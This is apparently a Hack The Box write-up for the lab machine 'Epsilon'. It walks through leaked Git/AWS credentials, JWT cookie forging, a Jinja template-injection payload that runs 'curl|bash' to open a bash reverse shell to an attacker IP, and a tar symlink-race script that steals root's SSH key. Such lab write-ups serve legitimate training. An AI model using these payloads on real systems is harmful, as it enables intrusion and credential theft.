@@ -1,0 +1,250 @@
+                   Epsilon
+
+                                                                           19th January 2022 / Document No D22.100.149
+                                                                           Prepared By: MrR3boot
+                                                                           Machine Author(s): MrR3boot
+                                                                           Difficulty: Medium
+
+                                                                                                                          Classification: Official
+
+Synopsis
+
+Epsilon is a medium difficulty Linux machine which exposes a Git repository on the webserver. AWS
+credentials are leaked in Git commits, which allows downloading the AWS Lambda function code. Secret key
+found in the source code can be used to forge a cookie to gain access to the web application. Foothold is
+obtained by exploiting the Server Side Template Injection vulnerability in the application feature. Abusing
+the tar symlink in a cronjob gives root access.
+
+Skills Required
+
+      Basic Linux Knowledge
+      Basic Cloud Knowledge
+      OWASP Top 10
+
+Skills Learned
+
+      Git Enumeration
+      Lambda Function Enumeration
+      Authentication Bypass
+      Server Side Template Injection
+      Tar Symlink Exploitation
+
+Enumeration
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.129.96.99 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.129.96.99
+
+Nmap scan reveals that the target host has 3 ports open. Let's browse to port 80.
+
+This says forbidden. Browsing to port 5000 reveals a login page.
+Bruteforcing or SQL Injection attempts failed on this login.
+
+FFUF
+
+Let's enumerating files and folders on port 80 using ffuf.
+
+This reveals a Git repository. We can use git-dumper to download the repository.
+Git
+
+   pip3 install git-dumper
+
+We find python scripts inside repo .
+
+Let's check the contents of server.py .
+   #!/usr/bin/python3
+   import jwt
+   from flask import *
+   app = Flask(__name__)
+   secret = '<secret_key>'
+   ...
+   @app.route("/", methods=["GET","POST"])
+   def index():
+                 if request.method=="POST":
+                                if request.form['username']=="admin" and
+   request.form['password']=="admin":
+                                              res = make_response()
+                                              username=request.form['username']
+
+                                              token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+                                              res.set_cookie("auth",token)
+
+                                              res.headers['location']='/home'
+
+                                              return res,302
+   ...
+
+This is the source code of the flask application that is running on port 5000. Trying admin / admin
+credentials didn't work on login. The secret key value is masked. Let's check the contents of
+track_api_CR_148.py .
+
+   import io
+   import os
+   from zipfile import ZipFile
+   from boto3.session import Session
+
+   session = Session(
+          aws_access_key_id='<aws_access_key_id>',
+          aws_secret_access_key='<aws_secret_access_key>',
+          region_name='us-east-1',
+          endpoint_url='http://cloud.epsilon.htb')
+
+   aws_lambda = session.client('lambda')
+   ...
+
+This script updates the lambda function code. The AWS credentials values are masked here. Let's check the
+git logs.
+Checking first commit we see the AWS credentials.
+Foothold
+
+Lambda
+
+Configure these keys and list the lambda function.
+
+   aws configure
+   AWS Access Key ID [None]: AQLA5M37BDN6FJP76TDC
+   AWS Secret Access Key [None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
+   Default region name [None]: us-east-1
+   Default output format [None]:
+
+   aws --endpoint-url=http://cloud.epsilon.htb lambda list-functions
+We see a lambda function costume_shop_v1 . Let's get the code location using get-function privilege.
+   aws --endpoint-url=http://cloud.epsilon.htb lambda get-function --function-
+   name=costume_shop_v1 | jq .Code.Location
+
+We can copy the Code.Location and download the source code.
+   wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code && unzip code
+
+This zip file contains lambda_function.py file. Let's view its contents.
+
+   import json
+
+   secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124
+
+   '''Beta release for tracking'''
+   def lambda_handler(event, context):
+
+          try:
+                 id=event['queryStringParameters']['order_id']
+                 if id:
+                         return {
+                              'statusCode': 200,
+                              'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
+                         }
+                 else:
+                         return {
+                                'statusCode': 500,
+                                'body': json.dumps('Invalid Order ID')
+                         }
+
+          except:
+                 return {
+                                'statusCode': 500,
+                                'body': json.dumps('Invalid Order ID')
+                         }
+
+This reveals a secret that is going to be used for apigateway authorization. It could be that the same secret
+maybe used on flask application too. As we are aware of cookie format from server.py . Let's forge new
+cookie as admin user using the above secret key.
+
+   python3
+   >>> import jwt
+   >>> jwt.encode({"username":"admin"},'RrXCv`mrNe!K!4+5`wYq',algorithm='HS256')
+   'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb
+   _hrdSHl0iLMGz-Ece7VNtg'
+
+Add a new cookie named auth in browser with the above value. This allows us to access /home page.
+Reviewing the server.py , we find the template injection in /order route.
+
+   @app.route('/order',methods=["GET","POST"])
+   def order():
+
+      if verify_jwt(request.cookies.get('auth'),secret):
+          if request.method=="POST":
+              costume=request.form["costume"]
+              message = '''
+              Your order of "{}" has been placed successfully.
+              '''.format(costume)
+              tmpl=render_template_string(message,costume=costume)
+              return render_template('order.html',message=tmpl)
+          else:
+              return render_template('order.html')
+
+The costume parameter is placed directly in the template string without any input sanitisation making this
+vulnerable to Server Side Template Injection. Let's place an order and capture the request in burp suite.
+Replace costume value with {{ 7*7 }} .
+The server evaluates the expression and renders the response as 49 . This can be exploited by issuing
+below command.
+
+   {{
+   self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()
+   }}
+
+Let's set up server to deliver the payload.
+   echo -n '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.15/1234 0>&1"' > index.html
+   sudo python3 -m http.server 80
+
+Stand up a listener on port 1234 and issue another request with below payload.
+   {{ self._TemplateReference__context.namespace.__init__.__globals__.os.system('curl
+   10.10.14.15|bash').read() }}
+Issue below commands to gain stable shell.
+   python3 -c 'import pty;pty.spawn("/bin/bash")'
+   ctrl+z
+   stty raw -echo
+   fg
+   return
+   export TERM=xterm
+
+Privilege Escalation
+
+Having foothold on the server we can enumerate the file system. Monitoring running processes using pspy
+reveals that every minute /usr/bin/backup.sh is running as root.
+
+Let's check the contents of backup.sh file.
+   #!/bin/bash
+   file=`date +%N`
+   /usr/bin/rm -rf /opt/backups/*
+   /usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
+   sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
+   sleep 5
+   check_file=`date +%N`
+   /usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum
+   "/opt/backups/$file.tar"
+   /usr/bin/rm -rf /opt/backups/*
+
+Script does the following steps.
+      Remove all files in /opt/backups folder
+      Backup the files from /var/www/app folder and place them in /opt/backups/<int> format
+      Generate sha1 of the tar and save in checksum file and give all permissions to this file
+      Sleeps 5 seconds
+      Then tar the previous tar file and checksum file and move them to /var/backups/web_backups folder
+      Remove again all files from /opt/backups folder
+
+We can see that the second tar command uses h flag which fetches the content of symlinks and does the
+compression. We can remove the checksum file and place a symlink to SSH key of root user within 5
+seconds time span. We can achieve the same using below bash script.
+
+   #!/bin/sh
+
+   if [ -e /opt/backups/checksum ]; then
+      rm -f /opt/backups/checksum
+      echo '[+] Checksum file removed'
+      ln -sf /root/.ssh/id_rsa /opt/backups/checksum
+      echo '[+] Symlink placed'
+
+   fi
+
+Save this as exploit.sh and run it in a while loop.
+
+   while true; do ./exploit.sh; done
+
+Copy latest time stamp .tar file from /var/backups/web_backups folder and extract the contents.
+   cp 455043040.tar /tmp;cd /tmp
+   tar -xvf 455043040.tar; cat opt/backups/checksum
+
+We can login as root using this key.
+   chmod 600 checksum;ssh -i checksum root@localhost
+
